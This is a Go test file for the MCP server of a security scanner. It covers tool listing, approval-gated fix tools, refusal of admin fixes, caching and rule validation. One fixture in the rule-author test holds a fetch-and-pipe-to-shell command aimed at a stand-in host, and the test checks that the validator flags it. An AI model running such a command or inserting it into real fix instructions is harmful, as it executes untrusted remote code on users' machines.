package mcp

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/The-Last-Devops/security-warden/internal/engine"
	"github.com/The-Last-Devops/security-warden/internal/ignore"
	"github.com/The-Last-Devops/security-warden/internal/report"
	"github.com/The-Last-Devops/security-warden/internal/source"
)

var (
	findA = engine.Finding{RuleID: "credential-file-readable-by-others", Severity: "high", Source: "credential_files",
		Title: "Credential file readable by other users: /tmp/a/credentials", Explain: "Others can read it.",
		Fix:    "Press Fix to do it automatically, or run: `chmod 600 '/tmp/a/credentials'`",
		Remedy: &engine.Remedy{Action: "chmod_private", Params: map[string]string{"path": "/tmp/a/credentials"}},
		Item:   engine.Item{"path": "/tmp/a/credentials"}}
	findB = engine.Finding{RuleID: "credential-file-readable-by-others", Severity: "high", Source: "credential_files",
		Title: "Credential file readable by other users: /tmp/b/credentials", Explain: "Others can read it.",
		Fix:    "Press Fix to do it automatically, or run: `chmod 600 '/tmp/b/credentials'`",
		Remedy: &engine.Remedy{Action: "chmod_private", Params: map[string]string{"path": "/tmp/b/credentials"}},
		Item:   engine.Item{"path": "/tmp/b/credentials"}}
	findC = engine.Finding{RuleID: "macos-firewall-off", Severity: "medium", Source: "posture",
		Title: "The firewall is off", Explain: "Apps can be reached.", Fix: "1. Open System Settings. 2. Run `sudo socketfilterfw --setglobalstate on`.",
		Remedy: &engine.Remedy{Action: "macos_firewall_on"}, Item: engine.Item{"firewall": false}}
	findD = engine.Finding{RuleID: "secret-in-repo", Severity: "critical", Source: "dev_files",
		Title: "Secret in a repository: app/.env", Explain: "Anyone with the repo has it.", Fix: "1. Rotate the key. 2. Run `git rm --cached .env`.",
		Item: engine.Item{"file": ".env", "repo_name": "app"}}
)

func testRules() []*engine.Rule {
	mk := func(id, sev, src string) *engine.Rule {
		return &engine.Rule{ID: id, Severity: sev, Source: src, Platforms: []string{"macos", "linux"},
			Title: engine.Text{"en": "Title of " + id, "vi": "Tiêu đề " + id}, Check: engine.Text{"en": "Check " + id},
			Explain: engine.Text{"en": "Why " + id}, Fix: engine.Text{"en": "Fix {path}"}}
	}
	return []*engine.Rule{
		mk("credential-file-readable-by-others", "high", "credential_files"),
		mk("macos-firewall-off", "medium", "posture"),
		mk("secret-in-repo", "critical", "dev_files"),
		mk("backup-none", "medium", "backup"),
	}
}

type fake struct {
	collects atomic.Int32
	applied  []string
	srv      *Server
}

func newFake(t *testing.T, allow bool) *fake {
	f := &fake{}
	f.srv = New(Config{
		Version: "v9.9.9",
		Rules:   testRules(),
		Collect: func(context.Context) []source.Result {
			f.collects.Add(1)
			return []source.Result{{Name: "posture"}}
		},
		Evaluate: func(_ []source.Result, lang string, _ bool) report.Scan {
			return report.Scan{Version: "v9.9.9", Lang: lang, Platform: "macos", Host: "test",
				Score: 20, ScoreMachine: 40, ScoreCode: 5, Gain: map[string]int{"secret-in-repo": 22, "macos-firewall-off": 3},
				Checked: 4, Passed: []string{"backup-none"},
				Sources:  []report.SourceStatus{{Name: "posture", Items: 1}, {Name: "defender", Skipped: "skip.platform"}},
				Findings: []engine.Finding{findC, findA, findD, findB}}
		},
		AllowChanges: allow,
		Ignore:       &ignore.Store{Path: t.TempDir() + "/ignores.json"},
		Apply: func(batch, rule, action string, p map[string]string) error {
			f.applied = append(f.applied, action+" "+p["path"])
			return nil
		},
	})
	return f
}

// session pipes lines through the server and returns the responses by id
// (notifications and id-less errors under "null").
func session(t *testing.T, s *Server, lines ...string) (map[string]map[string]any, []string) {
	t.Helper()
	var out bytes.Buffer
	if err := s.Serve(context.Background(), strings.NewReader(strings.Join(lines, "\n")+"\n"), &out); err != nil {
		t.Fatal(err)
	}
	byID := map[string]map[string]any{}
	var raw []string
	for _, l := range strings.Split(strings.TrimSpace(out.String()), "\n") {
		if l == "" {
			continue
		}
		raw = append(raw, l)
		var m map[string]any
		if err := json.Unmarshal([]byte(l), &m); err != nil {
			t.Fatalf("stdout line is not JSON: %q", l)
		}
		if m["jsonrpc"] != "2.0" {
			t.Errorf("no jsonrpc 2.0: %s", l)
		}
		id, _ := json.Marshal(m["id"])
		byID[string(id)] = m
	}
	return byID, raw
}

func call(id int, name string, args string) string {
	return fmt.Sprintf(`{"jsonrpc":"2.0","id":%d,"method":"tools/call","params":{"name":%q,"arguments":%s}}`, id, name, args)
}

func result(t *testing.T, r map[string]any) map[string]any {
	t.Helper()
	res, ok := r["result"].(map[string]any)
	if !ok {
		t.Fatalf("no result: %v", r)
	}
	return res
}

func toolNames(t *testing.T, r map[string]any) map[string]map[string]any {
	names := map[string]map[string]any{}
	for _, x := range result(t, r)["tools"].([]any) {
		tl := x.(map[string]any)
		names[tl["name"].(string)] = tl
	}
	return names
}

func TestInitializeListAndScan(t *testing.T) {
	f := newFake(t, false)
	byID, _ := session(t, f.srv,
		`{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"t","version":"1"}}}`,
		`{"jsonrpc":"2.0","method":"notifications/initialized"}`,
		`{"jsonrpc":"2.0","id":2,"method":"tools/list"}`,
		call(3, "scan", `{}`),
		`{"jsonrpc":"2.0","id":"p","method":"ping"}`,
	)
	if len(byID) != 4 {
		t.Fatalf("want 4 responses (none for the notification), got %d: %v", len(byID), byID)
	}
	init := result(t, byID["1"])
	if init["protocolVersion"] != "2025-06-18" {
		t.Errorf("protocolVersion = %v", init["protocolVersion"])
	}
	if si := init["serverInfo"].(map[string]any); si["name"] != "security-warden" || si["version"] != "v9.9.9" {
		t.Errorf("serverInfo = %v", si)
	}
	if _, ok := init["capabilities"].(map[string]any)["tools"]; !ok {
		t.Error("no tools capability")
	}
	if !strings.Contains(init["instructions"].(string), "rotate") {
		t.Error("instructions do not mention rotating leaked secrets")
	}

	names := toolNames(t, byID["2"])
	for _, n := range []string{"scan", "list_problems", "get_fix", "explain_rule", "list_safe", "status"} {
		tl, ok := names[n]
		if !ok {
			t.Errorf("missing tool %s", n)
			continue
		}
		ann := tl["annotations"].(map[string]any)
		if ann["readOnlyHint"] != true || ann["destructiveHint"] != false {
			t.Errorf("%s annotations = %v", n, ann)
		}
		if tl["inputSchema"].(map[string]any)["type"] != "object" {
			t.Errorf("%s inputSchema", n)
		}
	}
	for _, n := range []string{"apply_fix", "undo_fix", "hide", "restore"} {
		if _, ok := names[n]; ok {
			t.Errorf("changing tool %s listed without --allow-changes", n)
		}
	}

	res := result(t, byID["3"])
	if res["isError"] != false {
		t.Fatalf("scan error: %v", res)
	}
	sc := res["structuredContent"].(map[string]any)
	if sc["score"].(float64) != 20 || sc["score_machine"].(float64) != 40 || sc["score_code"].(float64) != 5 {
		t.Errorf("scores = %v", sc)
	}
	counts := sc["counts"].(map[string]any)
	if counts["critical"].(float64) != 1 || counts["high"].(float64) != 2 || counts["medium"].(float64) != 1 || counts["low"].(float64) != 0 {
		t.Errorf("counts = %v", counts)
	}
	probs := sc["problems"].([]any)
	if len(probs) != 3 {
		t.Fatalf("problems = %v", probs)
	}
	first := probs[0].(map[string]any)
	if first["rule_id"] != "secret-in-repo" || first["gain"].(float64) != 22 || first["has_auto_fix"] != false {
		t.Errorf("worst first: %v", first)
	}
	cred := probs[1].(map[string]any)
	if cred["places"].(float64) != 2 || cred["title"] != "Credential file readable by other users" || cred["has_auto_fix"] != true {
		t.Errorf("grouped: %v", cred)
	}
	text := res["content"].([]any)[0].(map[string]any)
	if text["type"] != "text" || !strings.Contains(text["text"].(string), "Score 20/100") {
		t.Errorf("text = %v", text)
	}
	if result(t, byID[`"p"`])["resultType"] != "complete" {
		t.Error("ping result")
	}
}

func TestChangingToolsNeedFlag(t *testing.T) {
	f := newFake(t, false)
	byID, _ := session(t, f.srv, call(1, "apply_fix", `{"rule_id":"credential-file-readable-by-others"}`))
	e, ok := byID["1"]["error"].(map[string]any)
	if !ok || e["code"].(float64) != codeInvalidParams || !strings.Contains(e["message"].(string), "--allow-changes") {
		t.Errorf("apply_fix without flag: %v", byID["1"])
	}
	if len(f.applied) != 0 {
		t.Error("applied without the flag")
	}

	f = newFake(t, true)
	byID, _ = session(t, f.srv, `{"jsonrpc":"2.0","id":1,"method":"tools/list"}`)
	names := toolNames(t, byID["1"])
	for _, n := range []string{"apply_fix", "undo_fix", "hide", "restore"} {
		tl, ok := names[n]
		if !ok {
			t.Errorf("missing %s", n)
			continue
		}
		if ann := tl["annotations"].(map[string]any); ann["destructiveHint"] != true || ann["readOnlyHint"] != false {
			t.Errorf("%s annotations = %v", n, ann)
		}
		if !strings.Contains(tl["description"].(string), "approval") && !strings.Contains(tl["description"].(string), "said yes") {
			t.Errorf("%s description does not ask for approval", n)
		}
	}
}

func TestApplyFixRefusesAdmin(t *testing.T) {
	f := newFake(t, true)
	key := engine.FindingID(findC)
	byID, _ := session(t, f.srv,
		call(1, "apply_fix", `{"rule_id":"credential-file-readable-by-others","keys":["`+key[:8]+`"]}`),
		call(2, "apply_fix", `{}`),
	)
	res := result(t, byID["1"])
	if res["isError"] != false {
		t.Fatalf("apply_fix: %v", res)
	}
	if len(f.applied) != 2 || f.applied[0] != "chmod_private /tmp/a/credentials" {
		t.Errorf("applied = %v", f.applied)
	}
	sc := res["structuredContent"].(map[string]any)
	if len(sc["applied"].([]any)) != 2 || len(sc["refused"].([]any)) != 1 {
		t.Errorf("result = %v", sc)
	}
	if r := sc["refused"].([]any)[0].(map[string]any); !strings.Contains(r["reason"].(string), "admin") {
		t.Errorf("refused reason = %v", r)
	}
	if result(t, byID["2"])["isError"] != true {
		t.Error("apply_fix with no target must be a tool error")
	}
}

func TestHideRestore(t *testing.T) {
	f := newFake(t, true)
	byID, _ := session(t, f.srv,
		call(1, "hide", `{"rule_id":"credential-file-readable-by-others","days":7}`),
		call(2, "hide", `{"rule_id":"secret-in-repo","days":365}`),
	)
	if sc := result(t, byID["1"])["structuredContent"].(map[string]any); len(sc["hidden"].([]any)) != 2 {
		t.Errorf("hide = %v", sc)
	}
	if result(t, byID["2"])["isError"] != true {
		t.Error("365 days accepted")
	}
	es, _ := f.srv.cfg.Ignore.List(time.Now())
	if len(es) != 2 {
		t.Fatalf("entries = %v", es)
	}
	byID, _ = session(t, f.srv, call(3, "restore", `{"all":true}`))
	if sc := result(t, byID["3"])["structuredContent"].(map[string]any); len(sc["restored"].([]any)) != 2 {
		t.Errorf("restore = %v", sc)
	}
}

func TestGetFixAndCache(t *testing.T) {
	f := newFake(t, false)
	byID, _ := session(t, f.srv,
		call(1, "get_fix", `{"rule_id":"secret-in-repo"}`),
		call(2, "get_fix", `{"rule_id":"backup-none"}`),
		call(3, "explain_rule", `{"rule_id":"backup-none","lang":"vi"}`),
		call(4, "list_problems", `{"severity_at_least":"high","limit":2}`),
		call(5, "list_safe", `{}`),
		call(6, "scan", `{"scope":"laptop"}`),
	)
	fx := result(t, byID["1"])["structuredContent"].(map[string]any)
	steps := fx["steps"].([]any)
	if len(steps) != 2 {
		t.Fatalf("steps = %v", steps)
	}
	if s2 := steps[1].(map[string]any); s2["commands"].([]any)[0] != "git rm --cached .env" {
		t.Errorf("step 2 = %v", s2)
	}
	if fx["remedy"].(map[string]any)["available"] != false {
		t.Errorf("remedy = %v", fx["remedy"])
	}
	if result(t, byID["2"])["isError"] != true {
		t.Error("get_fix of a passing rule must be a tool error")
	}
	byID2, _ := session(t, f.srv, call(9, "get_fix", `{"rule_id":"credential-file-readable-by-others"}`))
	cf := result(t, byID2["9"])["structuredContent"].(map[string]any)
	if st := cf["steps"].([]any)[0].(map[string]any); st["commands"] != nil || cf["commands_per_place"] != true {
		t.Errorf("per-place commands also in the steps: %v", cf)
	}
	if pl := cf["places"].([]any)[1].(map[string]any); pl["commands"].([]any)[0] != "chmod 600 /tmp/b/credentials" {
		t.Errorf("place 2 = %v", pl)
	}
	ex := result(t, byID["3"])["structuredContent"].(map[string]any)
	if ex["title"] != "Tiêu đề backup-none" || ex["category"] == "" {
		t.Errorf("explain = %v", ex)
	}
	lp := result(t, byID["4"])["structuredContent"].(map[string]any)
	if lp["total"].(float64) != 3 || lp["truncated"] != true || len(lp["problems"].([]any)) != 2 {
		t.Errorf("list_problems = %v", lp)
	}
	if p := lp["problems"].([]any)[0].(map[string]any); p["key"] == "" || p["place"] != "app/.env" {
		t.Errorf("entry = %v", p)
	}
	if ls := result(t, byID["5"])["structuredContent"].(map[string]any); ls["count"].(float64) != 1 {
		t.Errorf("list_safe = %v", ls)
	}
	if result(t, byID["6"])["isError"] != true {
		t.Error("bad scope accepted")
	}
	if n := f.collects.Load(); n != 1 {
		t.Errorf("scanned %d times, want 1 (cache)", n)
	}
	session(t, f.srv, call(7, "scan", `{"refresh":true}`))
	if n := f.collects.Load(); n != 2 {
		t.Errorf("refresh did not scan again: %d", n)
	}
}

func TestProtocolErrors(t *testing.T) {
	f := newFake(t, false)
	byID, raw := session(t, f.srv,
		`{not json`,
		`{"jsonrpc":"2.0","id":1,"method":"resources/list"}`,
		`{"jsonrpc":"1.0","id":2,"method":"ping"}`,
		`{"jsonrpc":"2.0","method":"unknown/notification"}`,
		call(3, "nope", `{}`),
		`{"jsonrpc":"2.0","id":4,"method":"tools/list","params":{"_meta":{"io.modelcontextprotocol/protocolVersion":"2026-07-28","io.modelcontextprotocol/clientCapabilities":{}}}}`,
		`{"jsonrpc":"2.0","id":5,"method":"tools/list","params":{"_meta":{"io.modelcontextprotocol/protocolVersion":"1900-01-01","io.modelcontextprotocol/clientCapabilities":{}}}}`,
		`{"jsonrpc":"2.0","id":6,"method":"server/discover","params":{"_meta":{"io.modelcontextprotocol/protocolVersion":"2026-07-28","io.modelcontextprotocol/clientCapabilities":{}}}}`,
		`[{"jsonrpc":"2.0","id":7,"method":"ping"}]`,
		call(8, "scan", `{"bogus":1}`),
	)
	code := func(id string) float64 {
		e, ok := byID[id]["error"].(map[string]any)
		if !ok {
			t.Errorf("%s: no error: %v", id, byID[id])
			return 0
		}
		return e["code"].(float64)
	}
	if code("1") != codeNoMethod || code("2") != codeInvalidRequest || code("3") != codeInvalidParams || code("5") != codeBadVersion {
		t.Errorf("codes: %v", byID)
	}
	nulls := 0
	for _, l := range raw {
		if strings.Contains(l, `"id":null`) {
			nulls++
			if !strings.Contains(l, fmt.Sprint(codeParse)) && !strings.Contains(l, fmt.Sprint(codeInvalidRequest)) {
				t.Errorf("null-id error: %s", l)
			}
		}
	}
	if nulls != 2 {
		t.Errorf("want parse + batch errors with null id, got %d", nulls)
	}
	if r := result(t, byID["4"]); r["resultType"] != "complete" || r["_meta"].(map[string]any)[metaServerInfo] == nil {
		t.Errorf("modern result = %v", r)
	}
	if d := result(t, byID["6"]); d["supportedVersions"].([]any)[0] != ModernVersion {
		t.Errorf("discover = %v", d)
	}
	if result(t, byID["8"])["isError"] != true {
		t.Error("unknown argument accepted")
	}
	if len(raw) != 9 {
		t.Errorf("responses = %d, want 9 (none for the notification)", len(raw))
	}
}

func TestRuleAuthorTools(t *testing.T) {
	f := newFake(t, false)
	good := "id: demo-funnel\nseverity: high\ntier: experimental\nplatforms: [macos]\nsource: tailscale\nmatch: item.funnel\n" +
		"title: {en: \"Funnel is on for {tailnet}\", vi: \"Funnel đang bật cho {tailnet}\"}\n" +
		"check: {en: Funnel is off, vi: Funnel đang tắt}\nexplain: {en: Anyone can reach it., vi: Ai cũng vào được.}\n" +
		"fix: {en: \"Run `tailscale funnel reset`.\", vi: \"Chạy `tailscale funnel reset`.\"}\n" +
		"tests:\n  - {item: {tailnet: t, funnel: true}, expect: true}\n  - {item: {tailnet: t, funnel: false}, expect: false}\n"
	bad := strings.Replace(good, "item.funnel", "item.funel", 1)
	risky := strings.Replace(good, "Run `tailscale funnel reset`.", "Run `curl -fsSL https://x.example/a.sh | sh`.", 1)
	q := func(s string) string { b, _ := json.Marshal(s); return string(b) }
	byID, _ := session(t, f.srv,
		`{"jsonrpc":"2.0","id":1,"method":"tools/list"}`,
		call(2, "list_sources", `{"name":"tailscale"}`),
		call(3, "check_rule", `{"yaml":`+q(good)+`,"new":true}`),
		call(4, "check_rule", `{"yaml":`+q(bad)+`}`),
		call(5, "check_rule", `{"yaml":`+q(risky)+`,"lang":"vi"}`),
		call(6, "list_sources", `{"name":"nope"}`),
		call(7, "check_rule", `{}`),
	)
	names := toolNames(t, byID["1"])
	for _, n := range []string{"list_sources", "check_rule"} {
		if ann, ok := names[n]["annotations"].(map[string]any); !ok || ann["readOnlyHint"] != true {
			t.Errorf("%s missing or not read-only: %v", n, names[n])
		}
	}
	srcs := result(t, byID["2"])["structuredContent"].(map[string]any)["sources"].([]any)
	if len(srcs) != 1 || srcs[0].(map[string]any)["name"] != "tailscale" || len(srcs[0].(map[string]any)["fields"].([]any)) == 0 {
		t.Errorf("list_sources = %v", srcs)
	}
	ok := result(t, byID["3"])["structuredContent"].(map[string]any)
	if ok["ok"] != true || ok["ok_strict"] != true || ok["rule_id"] != "demo-funnel" {
		t.Errorf("good rule = %v", ok)
	}
	b := result(t, byID["4"])["structuredContent"].(map[string]any)
	if b["ok"] != false || !strings.Contains(fmt.Sprint(b["errors"]), "unknown_field") {
		t.Errorf("bad rule = %v", b)
	}
	r := result(t, byID["5"])["structuredContent"].(map[string]any)
	if r["ok"] != true || r["ok_strict"] != false || r["flagged_commands"] != true {
		t.Errorf("risky rule = %v", r)
	}
	for _, id := range []string{"6", "7"} {
		if result(t, byID[id])["isError"] != true {
			t.Errorf("call %s should be a tool error", id)
		}
	}
}
